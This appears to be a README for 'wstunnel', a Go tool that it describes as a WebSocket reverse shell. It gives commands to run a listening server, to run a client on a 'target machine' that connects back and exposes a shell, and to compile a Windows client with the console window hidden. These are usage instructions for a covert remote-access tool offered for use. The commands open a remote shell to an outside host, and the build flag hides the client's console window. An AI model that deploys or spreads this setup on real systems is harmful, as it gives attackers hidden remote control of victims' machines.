# wstunnel

WebSocket-based reverse shell/tunnel tool. It allows a client to connect to a server via WebSocket and exposes a shell interface to the server.

## Usage

### Server
Run the server on a machine with a public IP or accessible network address.
```bash
./wstunnel_linux -s -addr :8080
```

### Client
Run the client on the target machine to connect back to the server.
```bash
./wstunnel -c -addr <ServerIP>:8080
```

## Compilation

### 1. Compile Linux Server/Client

Usually, the server runs on Linux.

```bash
go build -o wstunnel_linux main.go
```

### 2. Compile Windows Client

To hide the console window, use `-H=windowsgui`. It is recommended to omit this flag during testing to see error messages.

```bash
# Add -H=windowsgui to hide the console window (suggest not adding it during testing to see errors)
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -H=windowsgui" -o wstunnel.exe main.go
```
